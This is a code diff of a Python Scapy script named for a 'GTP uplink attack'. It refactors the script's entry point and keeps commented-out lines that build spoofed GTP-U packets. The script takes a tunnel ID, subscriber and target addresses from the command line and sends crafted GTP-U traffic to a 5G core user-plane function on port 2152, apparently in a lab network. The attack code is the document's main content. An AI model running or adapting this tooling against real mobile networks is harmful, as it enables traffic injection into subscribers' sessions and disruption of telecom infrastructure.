@@ -10,34 +10,6 @@ def new_seq(rand=False):
     return random.randint(0, 0xFFFF)
 
 
-TEID = int(sys.argv[1], 0)
-SRC_ADDR = "10.100.200.66"
-DST_ADDR = sys.argv[3]
-UE_ADDR = sys.argv[2]
-# GNB_ADDR = "10.100.200.14"
-GNB_ADDR = sys.argv[4]
-UPF_ADDR = "10.100.200.2"
-DPORT = 2152
-
-print(f"[i]  Interfaces: {get_if_list()}")
-
-
-arping(UPF_ADDR)
-
-
-# ip_payload = IP(src=dst_addr, dst=ue_addr) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
-
-# gtpu_header = GTP_U_Header(teid=teid) upf_addrip_payload
-
-# packet = IP(src=upf_addr, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header
-
-# logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_addr} through the upf ({upf_addr})")
-
-# send(packet)
-
-# logger.success("Packet sent successfully")
-
-
 def start_gtp_uplink_attack(
     src_addr, upf_addr, teid, ue_addr, dst_addr, upf_dport=2152
 ):
@@ -64,11 +36,39 @@ def start_gtp_uplink_attack(
     print("[+]  Packet sent successfully")
 
 
-start_gtp_uplink_attack(
-    src_addr=SRC_ADDR,
-    upf_addr=UPF_ADDR,
-    teid=TEID,
-    ue_addr=UE_ADDR,
-    dst_addr=DST_ADDR,
-    upf_dport=DPORT,
-)
+# ip_payload = IP(src=dst_addr, dst=ue_addr) / ICMP(type=8, id=0x1234, seq=new_seq(True)) / b"ABCDEFGHIJKLMNOPQRSTUVWX"
+
+# gtpu_header = GTP_U_Header(teid=teid) upf_addrip_payload
+
+# packet = IP(src=upf_addr, dst=gnb_addr) / UDP(dport=dport, sport=RandShort()) / gtpu_header
+
+# logger.info(f"Sending GTP-U packet with TEID {hex(teid)} to {ue_addr} through the upf ({upf_addr})")
+
+# send(packet)
+
+# logger.success("Packet sent successfully")
+
+
+if __name__ == "__main__":
+
+    TEID = int(sys.argv[1], 0)
+    SRC_ADDR = "10.100.200.66"
+    DST_ADDR = sys.argv[3]
+    UE_ADDR = sys.argv[2]
+    # GNB_ADDR = "10.100.200.14"
+    GNB_ADDR = sys.argv[4]
+    UPF_ADDR = "10.100.200.2"
+    DPORT = 2152
+
+    print(f"[i]  Interfaces: {get_if_list()}")
+
+    arping(UPF_ADDR)
+
+    start_gtp_uplink_attack(
+        src_addr=SRC_ADDR,
+        upf_addr=UPF_ADDR,
+        teid=TEID,
+        ue_addr=UE_ADDR,
+        dst_addr=DST_ADDR,
+        upf_dport=DPORT,
+    )
